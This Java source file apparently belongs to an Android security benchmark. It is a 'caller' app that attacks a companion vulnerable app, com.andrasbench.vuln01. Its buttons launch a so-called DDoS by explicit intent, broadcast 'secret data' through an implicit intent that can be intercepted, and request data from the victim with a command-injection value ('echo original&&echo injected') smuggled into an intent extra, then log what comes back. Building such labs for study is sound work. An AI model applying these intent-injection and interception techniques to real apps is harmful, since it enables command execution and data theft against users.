package com.andrasbench.vuln01_caller;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button b1 = findViewById(R.id.button1);
        Button b2 = findViewById(R.id.button2);
        Button b3 = findViewById(R.id.button3);

        ActivityResultLauncher<Intent> resultLauncher = registerForActivityResult(
                new ActivityResultContracts.StartActivityForResult(), result -> {
            if (result.getResultCode() == Activity.RESULT_OK) {
                Intent data = result.getData();
                if (data == null) return;
                String r = data.getStringExtra("result");
                Log.d("result from victim", r);
            }
        });

        // Explicit -> MainActivity
        b1.setOnClickListener(v -> ddosVictim());
        // Implicit -> MITM -> Main Activity and back
        b2.setOnClickListener(v -> mitmVulnerable());

        b3.setOnClickListener(v -> requestDataFromVictim(resultLauncher));
    }

    private void mitmVulnerable() {
        Intent i = new Intent();
        i.setAction(Intent.ACTION_SEND);
        i.putExtra(Intent.EXTRA_TEXT, "secret data");
        i.setType("text/plain");
        Intent chooser = Intent.createChooser(i, null);
        startActivity(chooser);
    }

    private void ddosVictim() {
        Intent i = getPackageManager().getLaunchIntentForPackage("com.andrasbench.vuln01");
        if (i != null) {
            i.putExtra("value", "1234567890");
            startActivity(i);
        } else {
            Log.d("Intent", "Explicit fail");
        }
    }

    private void requestDataFromVictim(ActivityResultLauncher<Intent> x) {
        Intent i = getPackageManager().getLaunchIntentForPackage("com.andrasbench.vuln01");
        if (i != null) {
            i.setFlags(0);
            i.putExtra("requestData", true);
            i.putExtra("command", "echo original&&echo injected");
            x.launch(i);
        } else {
            Log.d("Intent", "Request data fail");
        }
    }
}